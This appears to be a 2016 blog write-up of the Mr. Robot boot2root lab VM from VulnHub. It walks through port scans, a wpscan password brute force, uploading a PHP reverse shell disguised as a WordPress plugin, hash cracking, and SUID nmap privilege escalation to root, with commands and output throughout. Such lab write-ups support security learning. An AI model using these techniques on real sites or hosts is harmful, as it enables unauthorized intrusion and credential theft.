---
layout: post
title: "Mr. Robot hacking challenge"
date: 2016-09-08 01:37:52 -0400
comments: true
categories: boot2root
---

Time for another boot2root! I'm a fan of the Mr. Robot TV series, so I was looking forward to giving this one a go. It's been out for a while now and can be downloaded from [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/). This challenge is based off the TV show and contains three flags. To ensure I was in the proper mood, I put on the [Mr. Robot Soundtrack](https://itunes.apple.com/ca/album/mr.-robot-vol.-1-original/id1111847619), dimmed the lights, kept my power drill beside me, and fired up the official Mr. Robot hacking OS; [Kali Linux](https://www.kali.org/). 

First up, a detailed TCP and UDP port scan to ensure I didn't miss anything. 

```
# onetwopunch.sh -t ip.txt -p all -i eth1 -n '-sV -A'
                             _                                          _       _ 
  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \
 / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /
| (_) | | | |  __/ ᕦ(ò_óˇ)ᕤ | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/ 
 \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/   
                                                |_|                               
                                                                   by superkojiman

[+] Protocol : all
[+] Interface: eth1
[+] Nmap opts: -sV -A
[+] Targets  : ip.txt
[+] Scanning 172.16.146.134 for all ports...
[+] Obtaining all open TCP ports using unicornscan...
[+] unicornscan -i eth1 -mT 172.16.146.134:a -l /root/.onetwopunch/udir/172.16.146.134-tcp.txt
[*] TCP ports for nmap to scan: 80,443,
[+] nmap -e eth1 -sV -A -oX /root/.onetwopunch/ndir/172.16.146.134-tcp.xml -oG /root/.onetwopunch/ndir/172.16.146.134-tcp.grep -p 80,443, 172.16.146.134

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-09-07 12:42 EDT
Nmap scan report for 172.16.146.134
Host is up (0.00040s latency).
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 00:0C:29:EC:11:E3 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.1, Linux 3.2 - 4.4
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 172.16.146.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.98 seconds
[+] Obtaining all open UDP ports using unicornscan...
[+] unicornscan -i eth1 -mU 172.16.146.134:a -l /root/.onetwopunch/udir/172.16.146.134-udp.txt
[*] UDP ports for nmap to scan: 67,
[+] nmap -e eth1 -sV -A -sU -oX /root/.onetwopunch/ndir/172.16.146.134-udp.xml -oG /root/.onetwopunch/ndir/172.16.146.134-udp.grep -p 67, 172.16.146.134

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-09-07 12:46 EDT
Nmap scan report for 172.16.146.134
Host is up (0.00039s latency).
PORT   STATE         SERVICE VERSION
67/udp open|filtered dhcps
MAC Address: 00:0C:29:EC:11:E3 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 172.16.146.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.90 seconds
[+] Scans completed
[+] Results saved to /root/.onetwopunch
```

TCP 80 and 443 were both open and running HTTP. I fired up nikto to see if anything interesting came up. 

```
# nikto -host http://172.16.146.134
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.146.134
+ Target Hostname:    172.16.146.134
+ Target Port:        80
+ Start Time:         2016-09-07 15:51:20 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad 
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://172.16.146.134/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A WordPress installation was found.
+ /wp-admin/wp-login.php: WordPress login found
+ /blog/wp-login.php: WordPress login found
+ /wp-login.php: WordPress login found
+ 7535 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2016-09-07 15:54:00 (GMT-4) (160 seconds)
---------------------------------------------------------------------------
```

Looks like it was running WordPress. I downloaded the robots.txt to see if it was hiding anything of interest:

```
# curl http://172.16.146.134/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Found the first flag, and something called fsocity.dic.

```
# curl http://172.16.146.134/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

fsocity.dic was some kind of wordlist:

```
# head fsocity.dic 
true
false
wikia
from
the
now
Wikia
extensions
scss
window
.
.
.
```

Next I checked out http://172.16.146.134/blog/wp-login, which returned an unfinished WordPress blog. I ran wpscan on the site and found nothing that I could use to really exploit the site. Brute-forcing a login to the blog seemed to be the next course of action given that a wordlist had been conveniently provided. Being a Mr. Robot themed VM, I tried guessing various user names based off characters on the show, and seeing what error I'd get. I got a good hit on the user "elliot" when WordPress complained that the password was incorrect, rather than the user didn't exist. 

I used wpscan to perform the dictionary attack on the WordPress instance:

```
[+] Starting the password brute forcer
t  Brute Forcing 'elliot' Time: 00:20:45 <=========                                                                                                           > (74381 / 858161)  8.66%  ETA: 03:38:4t  Brute Forcing 'elliot' Time: 00:41:40 <===================                                                                                                > (151431 / 858161) 17.64%  ETA: 03:14:3t  Brute Forcing 'elliot' Time: 00:41:43 <===================                                                                                                > (151631 / 858161) 17.66%  ETA: 03:14:2  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                                                                  

  Brute Forcing 'elliot' Time: 03:50:21 <=================================================================================================================  > (858160 / 858161) 99.99%  ETA: 00:00:00
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+

[+] Finished: Thu Sep  8 01:31:32 2016
[+] Requests Done: 858206
[+] Memory used: 16.094 MB
[+] Elapsed time: 03:50:22
```

Almost 4 hours later, I got the password: ER28-0652. 

So I logged in and poked around. Next step seemed to be to get a shell on the target. That could easily be done by uploading a reverse shell plugin. I made a copy of Kali's php-reverse-shell.php, setup my IP address and port I'd be listening on, and added some comments at the top to make it a valid WordPress plugin:

```
<?php
/*
*     Plugin Name: Pwn It
*     Plugin URI: https://github.com/superkojiman/pwnit
*     Description: Get a shell yo
*     Author: superkojiman
*     Version: 13.37
*     Author URI: https://techorganic.com
*                             
*/
```

I zipped it up, uploaded the plugin and activated it. It worked, and I got a reverse shell on my listener:

```
# nc -lvp 443
listening on [any] 443 ...
172.16.146.134: inverse host lookup failed: Host name lookup failure
connect to [172.16.146.139] from (UNKNOWN) [172.16.146.134] 41298
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 13:57:46 up 31 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

I was logged in as daemon. Time to explore. 

```
$ cd /home
$ ls -latr
total 12
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
$ cd robot
$ ls -latr
total 16
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Found a directory called /home/robot with the second key, as well as a file called password.raw-md5. I didn't have read permissions on the key, but I could read the contents of the password.raw-md5:

```
$ cat pass*
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Perhaps this was the password for the robot user account. Checking [md5cracker.org](http://md5cracker.org/decrypted-md5-hash/c3fcd3d76192e4007dfb496cca67e13b) revealed the password to be abcdefghijklmnopqrstuvwxyz

```
daemon@linux:/home/robot$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ 
```

w00t! One step closer to pwning this box. I opened up the key file next:

```
$ cat key* 
cat key*
822c73956184f694993bede3eb39f959
```

Poking around some more I found that FTP and MySQL was listening on the local interface. 

```
$ netstat -lnp tcp
netstat -lnp tcp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:3025            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp6       0      0 :::53141                :::*                                -  
```

But more importantly, I found nmap in /usr/local/bin with SUID root privileges! This version of nmap also had the --interactive option, which meant I could run commands as root:

```
$ ls -l /usr/local/bin/nmap
ls -l /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !id
!id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
waiting to reap child : No child processes
nmap> 
```

Instant root shell!

```
nmap> !/bin/dash
!/bin/dash
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

Now I could see what was in /root

```
# cd /root
cd /root
# ls -latr
ls -latr
total 32
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwx------  2 root root 4096 Nov 13  2015 .cache
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
drwx------  3 root root 4096 Nov 13  2015 .
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
```

Found the third key:

```
# cat key*
cat key*
04787ddef27c3dee1ee161b21670b4e4
```

I now had all three keys:

1. 073403c8a58a1f80d943455fb30724b9
1. 822c73956184f694993bede3eb39f959
1. 04787ddef27c3dee1ee161b21670b4e4

Wasn't entirely sure what to do with them, but I decided to poke around more. First up, the MySQL instance. MySQL is installed in /opt/bitnami/mysql and the root login for the instance had the default password of "bitnami". Once I logged in, I looked at the contents of the wp_users table:


```
mysql> select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| mich05654  | $P$BpmKcWWjgC3/UGtj/fO36PsCxYC2E51 |
| elliot     | $P$BHh01ohuhaRcy2EAC6ad//vTQ1eMwe. |
+------------+------------------------------------+
2 rows in set (0.00 sec)
```

So there was another user, mich05654 with password hash $P$BpmKcWWjgC3/UGtj/fO36PsCxYC2E51. I ran that through john and it cracked it instantly:

```
# john --wordlist=/root/mrrobot/fsocity.dic mich.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Dylan_2791       (mich05654)
1g 0:00:00:00 DONE (2016-09-08 11:00) 2.631g/s 5557p/s 5557c/s 5557C/s latest..22title
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Password: Dylan_2791

I logged into WordPress using those account credentials and found that it was the account of Elliot's therapist; Krista Gordon. 

I initially thought I had to use those keys for something, but I couldn't really find anything else to do. So I suppose that's it.

Overall, this was pretty fun, despite the insanely long time it took to brute-force ellito's password. I was clued in later on that there were lots of duplicates in the fsocity.dic file that I could have removed to speed things up. Lesson learned. It was smooth sailing once I got a shell though. Cheers to Jason for creating it and making it available!
